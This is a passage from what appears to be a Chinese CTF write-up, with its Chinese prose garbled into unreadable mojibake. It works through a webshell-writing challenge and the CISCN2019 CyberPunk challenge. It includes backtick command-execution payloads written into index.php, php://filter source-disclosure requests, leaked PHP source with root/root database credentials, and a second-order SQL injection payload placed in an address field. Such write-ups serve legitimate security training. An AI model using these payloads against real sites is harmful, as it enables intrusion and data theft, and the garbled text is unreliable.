class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-comment">//??è¡¨ç¤ºæ¥è®¾ç½®é»˜è®¤å€¼ï¼Œå³å¦‚æœä¸å­˜åœ¨åˆ™è®¾ç½®ä¸ºç©º</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//åŒä¸Šï¼Œè‹¥ä¸å­˜åœ¨åˆ™è®¾ç½®ä¸ºç©º</span><br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<span class="hljs-comment">//å°†dataå†™å…¥dir/index.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å…¶å®å¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬çš„è¾“å…¥(ä¹Ÿå¯ä»¥æ˜¯æ•°ç»„çš„å½¢å¼)ä¼šç»è¿‡<code>check</code>æ£€æŸ¥ã€‚æ£€æŸ¥æ²¡é—®é¢˜çš„è¯å¯ä»¥å…ˆé€šè¿‡<code>/?action=pwd</code>è·å¾—<code>dir</code>çš„å€¼(è¿™ä¸œè¥¿åé¢ä¼šå»å’Œ<code>index.php</code>æ‹¼æ¥ç»„æˆå®Œæ•´è·¯å¾„)ã€‚ç„¶å<code>/?action=upload&amp;data=æˆ‘ä»¬è¦å†™è¿›å»çš„webshell</code>ä¼šæŠŠ<code>webshell</code>å†™åˆ°è·¯å¾„é‡Œã€‚</p><p>å‚è€ƒï¼š<code>https://blog.csdn.net/cjdgg/article/details/118216890</code></p><p><code>php</code>çŸ­æ ‡ç­¾ï¼š</p><p><img src="/img/writeshell1.png" alt="writeshell1"></p><p><code>php</code>ä¸­çš„â€œ&#96;&#96;â€ä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="/img/writeshell2.png" alt="writeshell2"></p><p><code>/?action=pwd</code>:</p><p><img src="/img/writeshell3.png" alt="writeshell3"></p><p><code>sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</code></p><p><code>/?action=upload&amp;data=&lt;?=</code>ls<code>?&gt;</code>:</p><p>index.php</p><p><code>?action=upload&amp;data=&lt;?=</code>ls%09&#x2F;<code>?&gt;</code>(ç©ºæ ¼ç”¨<code>%09</code>ä»£æ›¿)</p><p><img src="/img/writeshell4.png" alt="writeshell4"></p><p><code>/?action=upload&amp;data=&lt;?=</code>cat%09&#x2F;flllllll1112222222lag<code>?&gt;</code></p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p><img src="/img/cyberpunk1.png" alt="cyberpunk1"></p><p>å•†åº—ç•Œé¢ï¼Œä¸‹é¢è¿˜æœ‰è®¢å•ç®¡ç†åŠŸèƒ½ï¼š</p><p><img src="/img/cyberpunk2.png" alt="cyberpunk2"></p><p>æºç ä¸­å­˜åœ¨å¦‚ä¸‹æç¤ºï¼š</p><p><img src="/img/cyberpunk3.png" alt="cyberpunk3"></p><p><code>?file=</code>ï¼ŒçŒœæµ‹<code>GET</code>æ–¹å¼ç»™<code>file</code>ä¼ å‚ã€‚è¯•äº†è¯•<code>/?file=flag.php</code>æ²¡å•¥ååº”ã€‚ä¼ªåè®®è¯»æºç è¯•è¯•ï¼š</p><p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><br><span class="hljs-comment">// $file = $_GET[&quot;file&quot;];</span><br><span class="hljs-variable">$file</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no way!&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=search.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$row</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&lt;p&gt;å§“å:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=change.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=delete.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;user_id&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è®¢å•åˆ é™¤æˆåŠŸ&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">///?file=php://filter/convert.base64-encode/resource=config.php</span><br>?php<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-variable">$DATABASE</span> = <span class="hljs-keyword">array</span>(<br><br>    <span class="hljs-string">&quot;host&quot;</span> =&gt; <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;username&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> =&gt; <span class="hljs-string">&quot;root&quot;</span>,<br>    <span class="hljs-string">&quot;dbname&quot;</span> =&gt;<span class="hljs-string">&quot;ctfusers&quot;</span><br>);<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;host&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;password&#x27;</span>],<span class="hljs-variable">$DATABASE</span>[<span class="hljs-string">&#x27;dbname&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹ç”¨æˆ·åå’Œç”µè¯è¿‡æ»¤å¾ˆä¸¥æ ¼è€Œä¸”å¼€äº†<code>/i</code>æ¨¡å¼ã€‚ä½†å¯¹åœ°å€åªè¿›è¡Œäº†ç®€å•çš„è½¬ä¹‰å¤„ç†ï¼š</p><p><code>$address = addslashes($_POST[&quot;address&quot;]);</code></p><p>äºŒæ¬¡æ³¨å…¥ï¼Œå‚è€ƒ<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>ä¹‹å‰å¯¹äºè½¬ä¹‰è¿™ä¸ªä¸œè¥¿ç†è§£è¿˜ä¸å¤ªå¥½ï¼Œç½‘ä¸Šæ‰¾äº†ç¯‡æ–‡ç« ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs mysql">//ä¸‹é¢çš„SELECTè¯­å¥æ˜¾ç¤ºäº†å¼•ç”¨å’Œè½¬ä¹‰å¦‚ä½•å·¥ä½œï¼š<br><br>mysql&gt; SELECT &#x27;hello&#x27;, &#x27;&quot;hello&quot;&#x27;, &#x27;&quot;&quot;hello&quot;&quot;&#x27;, &#x27;hel&#x27;&#x27;lo&#x27;, &#x27;\&#x27;hello&#x27;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &quot;hello&quot; | &quot;&quot;hello&quot;&quot; | hel&#x27;lo | &#x27;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br> <br><br>mysql&gt; SELECT &quot;hello&quot;, &quot;&#x27;hello&#x27;&quot;, &quot;&#x27;&#x27;hello&#x27;&#x27;&quot;, &quot;hel&quot;&quot;lo&quot;, &quot;\&quot;hello&quot;;<br><br>+-------+---------+-----------+--------+--------+<br><br>| hello | &#x27;hello&#x27; | &#x27;&#x27;hello&#x27;&#x27; | hel&quot;lo | &quot;hello |<br><br>+-------+---------+-----------+--------+--------+<br><br><br>//https://www.cnblogs.com/end/archive/2011/04/01/2002516.html<br></code></pre></td></tr></table></figure><p>ä¸ªäººç†è§£å°±æ˜¯ç»è¿‡è½¬ä¹‰<code>(å¢åŠ \)</code>ï¼Œä¸€äº›ç‰¹æ®Šå­—ç¬¦<code>(æ¯”å¦‚&#39;)</code>è¿™ä¸œè¥¿å°±å¤±å»äº†å®ƒæœ¬èº«çš„å«ä¹‰ï¼Œå˜æˆäº†æŸä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­æˆ‘ä»¬ä¹Ÿèƒ½çŸ¥é“ï¼Œå¢åŠ è½¬ä¹‰ç¬¦åä¸æ˜¯è¯´æˆ‘è¾“å…¥çš„æ•°æ®ä¹Ÿå¢åŠ äº†ä¸ªå­—ç¬¦ã€‚</p><p>ä¸»è¦æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//change.php</span><br><span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</span><br></code></pre></td></tr></table></figure><p>åœ¨æ³¨å†Œç”¨æˆ·çš„åœ°å€æ—¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„çš„<code>SQL</code>è¯­å¥<code>(ç»è¿‡è½¬ä¹‰åè¢«æ”¾åˆ°æ•°æ®åº“ä¸­ï¼Œç­‰ç€æˆ‘ä»¬åœ¨ä¿®æ”¹åœ°å€æ—¶è§¦å‘)</code>ã€‚ç„¶åæˆ‘ä»¬ä¿®æ”¹åœ°å€ï¼Œè§¦å‘åˆšåˆšæ„é€ çš„<code>sql</code>è¯­å¥ã€‚</p><p>åšæ³•çš„è¯æœ‰ä¸¤ç§ï¼Œå…ˆçœ‹ä¸åˆ©ç”¨æŠ¥é”™ç›´æ¥å›æ˜¾çš„ï¼š</p><p>å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„è§£æ³•ï¼š<code>https://www.cnblogs.com/Article-kelp/p/16052105.html</code></p><p>æˆ‘ä»¬å…ˆéšä¾¿æ³¨å†Œä¸¤ä¸ªè´¦æˆ·ï¼š<code>(ä¸€ä¸ªè´¦æˆ·å°±è¡Œï¼Œæˆ‘æ³¨å†Œä¸¤ä¸ªä¸ºäº†æ–¹ä¾¿è§£é‡Š)</code></p><p>åœ°å€(åˆ«ä¸¢äº†åå¼•å·)ï¼šâ€™,<code>address</code>&#x3D;database()#</p><p><img src="/img/cyberpunk7.png" alt="cyberpunk7"></p><p><img src="/img/cyber9.png" alt="cyber9"></p><p>åœ¨ä¿®æ”¹åœ°å€æ—¶ï¼Œ<code>SQL</code>è¯­å¥å˜æˆäº†ï¼š</p><p>$sql &#x3D; â€œupdate <code>user</code> set <code>address</code>&#x3D;â€™â€.$address.â€â€˜, <code>old_address</code>&#x3D;â€™â€™,<code>address</code>&#x3D;â€™database()â€™# è¿™åé¢çš„éƒ½æ²¡äº†â€â€˜ where <code>user_id</code>&#x3D;â€.$row[â€˜user_idâ€™];</p><p>æ—§åœ°å€ä¸ºç©ºï¼Œæ–°åœ°å€è¢«è®¾ç½®æˆæ•°æ®åº“åã€‚</p><p>ä½†è¦æ³¨æ„ç”±äºæ²¡æœ‰é™åˆ¶<code>user_id</code>ï¼Œæ‰€ä»¥<code>user</code>è¡¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„åœ°å€éƒ½æ˜¯æ•°æ®åº“åã€‚</p><p>ç°åœ¨æˆ‘ä»¬æŠŠ<code>1</code>çš„åœ°å€æ”¹æˆ<code>1</code>:</p><p><img src="/img/cyberpunk8.png" alt="cyberpunk8"></p><p>æäº¤åæŸ¥è¯¢ï¼š</p><p><img src="/img/cyber10.png" alt="cyber10"></p><p>å¯ä»¥çœ‹åˆ°åœ°å€çš„åå­—å·²ç»æ˜¯åº“åäº†ï¼Œç°åœ¨æˆ‘ä»¬åœ¨çœ‹çœ‹<code>2</code>çš„åœ°å€ï¼š</p><p><img src="/img/cyber11.png" 